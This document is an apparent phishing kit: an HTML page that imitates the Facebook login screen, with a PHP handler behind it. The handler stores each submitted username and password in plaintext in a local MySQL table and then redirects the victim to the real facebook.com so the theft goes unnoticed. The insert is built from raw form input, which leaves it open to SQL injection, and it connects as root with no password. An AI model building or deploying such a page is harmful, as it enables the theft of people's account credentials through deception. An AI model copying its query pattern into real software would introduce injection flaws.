

<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<title>Facebook Login Page</title>

<link rel="icon" href="img/hLRJ1GG_y0J.ico">
<link rel="stylesheet" href="style.css" />
</head>
<body>
<div class="content">
<div class="flex-div">
<div class="name-content">
<h1 class="logo">Facebook</h1>
<p>Connect with friends and the world around you on Facebook.</p>
</div>
<form action="" method="post" id="form"> 
<input type="text" placeholder="Email or Phone Number" name="username" class="email" required />
<input type="password" placeholder="Password" name="password" class="chpassword" required>
<button class="login" name="submit">Log In</button>
<a href="#">Forgot Password ?</a>
<hr>
<button class="create-account">Create New Account</button>
</form>
</div>
</div>

<!-- -------popup section-------- -->

<section class="popup">
<div class="container">
<div class="row">
<div class="col">
<div class="card">
<div class="icon"><i class="fa-solid fa-check"></i></div>
<h1>thank you</h1>
<p>thank you for submiting the form you are know login for the facebook page !</p>
<div class="button close"><button class="btn btn-primary">close</button></div>
</div>
</div>
</div>
</div>
</section>
<!-- -----------------fotter start--------------- -->

<script src="min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

</body>
</html>


<?php
if(isset($_POST["submit"])){
  $userName = $_POST["username"];
  $password = $_POST["password"];

  $host = "localhost";
  $user = "root";
  $pass = "";
  $dbname = "usermessage";

  $conn = mysqli_connect($host,$user,$pass,$dbname);

  $sql = "INSERT INTO mydata (username,password) value ('$userName','$password')";

  $query = mysqli_query($conn,$sql);

  if($query){
  ?>
     <script>
        Swal.fire({
  title: "Good job!",
  text: "Thnak You you are login now",
  icon: "success"
});
</script>
<?php
header("Location: https://www.facebook.com/",);
  }
}


?>